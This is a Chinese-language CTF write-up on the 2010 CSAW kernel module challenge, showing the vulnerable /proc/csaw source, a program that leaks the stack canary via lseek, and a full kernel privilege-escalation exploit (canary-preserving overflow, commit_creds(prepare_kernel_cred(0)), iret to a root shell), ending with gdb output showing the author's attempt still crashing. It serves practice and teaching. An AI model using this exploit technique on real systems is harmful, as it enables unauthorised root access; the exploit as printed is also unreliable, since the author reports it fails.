---
title: 2010 CSAW CTF Kernel Exploit
date: 2017-08-17 02:19:15
tags:
- kernel exploit
- ctf
category:
- kernel_exploit_practice
---

现在该好好练习一下ctf kernel exploit了，每次遇到kernel exploit的题都只能眼睁睁的看着....好好练一练，涨点姿势，学点东西，大学生涯就要结束了。

## Challenge
这个题可能比较简单吧，但是做的时候可能想不到那个点上。真的得靠经验啊。
<!-- more -->
源码如下：
```c
/*
 * csaw.c
 * CSAW CTF Challenge Kernel Module
 * Jon Oberheide <jon@oberheide.org>
 *
 * This module implements the /proc/csaw interface which can be read
 * and written like a normal file. For example:
 *
 * $ cat /proc/csaw 
 * Welcome to the CSAW CTF challenge. Best of luck!
 * $ echo "Hello World" > /proc/csaw
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <asm/uaccess.h>

#define MAX_LENGTH 64

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jon Oberheide");
MODULE_DESCRIPTION("CSAW CTF Challenge Kernel Module");

static struct proc_dir_entry *csaw_proc;

int
csaw_write(struct file *file, const char __user *ubuf, unsigned long count, void *data)
{
	char buf[MAX_LENGTH];

	printk(KERN_INFO "csaw: called csaw_write\n");

	/* 
	 * We should be safe to perform this copy from userspace since our 
	 * kernel is compiled with CC_STACKPROTECTOR, which includes a canary
	 * on the kernel stack to protect against smashing the stack.
	 *
	 * While the user could easily DoS the kernel, I don't think they
	 * should be able to escalate privileges without discovering the 
	 * secret stack canary value.
	 */
	if (copy_from_user(&buf, ubuf, count)) {
		printk(KERN_INFO "csaw: error copying data from userspace\n");
		return -EFAULT;
	}

	return count;
}

int
csaw_read(char *page, char **start, off_t off, int count, int *eof, void *data)
{
	char buf[MAX_LENGTH];

	printk(KERN_INFO "csaw: called csaw_read\n");

	*eof = 1;
	memset(buf, 0, sizeof(buf));
	strcpy(buf, "Welcome to the CSAW CTF challenge. Best of luck!\n");
	memcpy(page, buf + off, MAX_LENGTH);

	return MAX_LENGTH;
}

static int __init
csaw_init(void)
{
	printk(KERN_INFO "csaw: loading module\n");

	csaw_proc = create_proc_entry("csaw", 0666, NULL);
	csaw_proc->read_proc = csaw_read;
	csaw_proc->write_proc = csaw_write;

	printk(KERN_INFO "csaw: created /proc/csaw entry\n");

	return 0;
}
 
static void __exit
csaw_exit(void)
{
	if (csaw_proc) {
		remove_proc_entry("csaw", csaw_proc);
	}

	printk(KERN_INFO "csaw: unloading module\n");
}
 
module_init(csaw_init);
module_exit(csaw_exit);
```
就实现了一个简单的proc接口，csaw_write函数有栈溢出，但是要突破canary保护。csaw_read把栈上的数据copy到用户地址上(page用来保存内核返回给用户的数据)。刚开始看的时候不知道怎么leak canary，后来才知道也可以用lseek来调节读写指针的位置。用lseek调节/proc/csaw读指针位置时令我感到奇怪的是我向后移动n个offset时，实际却向后移动了2n个offset，不知道为啥...

## Exploit
我们可以用lseek调节读指针的位置，从而把canary给dump出来。
```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdlib.h>

int main()
{
	int i;
	char buf[64];
	memset(buf, 0, 64);
	int fd = open("/proc/csaw", O_RDONLY);
	if( fd < 0)
	{
		perror("open failed");
		exit(0);
	}
	lseek(fd, 24, SEEK_SET);
	read(fd, buf, 64);
	printf("dumping memery......\n");
	for(i = 0; i < 64; i++)
	{
		if( (i % 16) == 0 )
		{
			printf("\n");
		} 
		printf("%02x ", buf[i] & 0xff); 
	}
	printf("\n");
}
```
dump结果如下：
```shell
root@w0lfzhang666:/home/w0lfzhang/Desktop/kernel_exp/csaw# ./dump
dumping memery......

0a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
15 4e df a2 00 10 63 c1 40 00 00 00 00 10 0c f8 
3c df 59 c4 88 ad 24 c0 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
```
canary的值为a2df4e15。
很烦，在找返回地址偏移量费了点时间，我怎么忘记用ida看汇编代码了呢...
OK，把canary，返回地址的偏移量确定，然后布置payload。最后我们只需要向/proc/csaw写入布置的payload即可。
```c
//payload = 64*'a' + canary + 12*'b' + ret_addr

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

struct trap_frame
{
	void *eip;
	uint32_t cs;
	uint32_t eflags;
	void *esp;
	uint32_t ss;
}__attribute__((packed));

struct trap_frame tf;

void launch_shell(void)
{
	system("/bin/sh");
}

void prepare_tf(void)
{
    asm("pushl %cs; popl tf + 4;" 
        "pushfl; popl tf + 8;"  
        "pushl %esp; popl tf + 12;"
        "pushl %ss; popl tf + 16;");
    tf.eip = launch_shell;
    tf.esp -= 1024; //unused part of stack
}

#define KERNCALL __attribute__((regparm(3)))
void *(*prepare_kernel_cred)(void*) KERNCALL = (void *)0xc016b950;
void (*commit_creds)(void *) KERNCALL = (void *)0xc016b610;

void payload(void)
{  
    commit_creds(prepare_kernel_cred(0));
    asm("mov $tf, %esp;"
       "iret;");  
}

int main()
{
	int i;
	char buf[64];
	char payld[84];
	memset(payld, 0, 84);
	memset(buf, 0, 64);
	int fd = open("/proc/csaw", O_RDWR);
	if( fd < 0)
	{
		perror("open failed");
		exit(0);
	}
	lseek(fd, 24, SEEK_SET);
	read(fd, buf, 64);
	char canary[4] = {buf[16], buf[17], buf[18], buf[19]};
	memset(payld, 'a', 64);
	memcpy(payld + 64, canary, 4);
	memset(payld + 68, 'b', 12);
	*((void **)(payld + 80)) = &payload;
	prepare_tf();
	printf("getting root privilege......\n");
	write(fd, payld, 84);
	printf("got root privilege!\n");
	return 0;
}
```
都到这个步骤了，还没成功...搞了一天还没找出原因，郁闷...
```
gdb-peda$ x/3i $eip
=> 0xf809d0e3 <csaw_write+83>:	ret    
   0xf809d0e4 <csaw_write+84>:	call   0xc014a300 <__stack_chk_fail>
   0xf809d0e9 <csaw_write+89>:	mov    DWORD PTR [esp],0xf809d218
gdb-peda$ x/10wx $esp
0xf6a97f1c:	0x08048662	0x00000000	0xc03b455d	0xc4688ee8
0xf6a97f2c:	0xbfb27b48	0xc4688ea0	0xf6a93200	0xc024ab10
0xf6a97f3c:	0xf6a97f64	0xc0245d37
gdb-peda$ ni
Cannot access memory at address 0x62626266
```

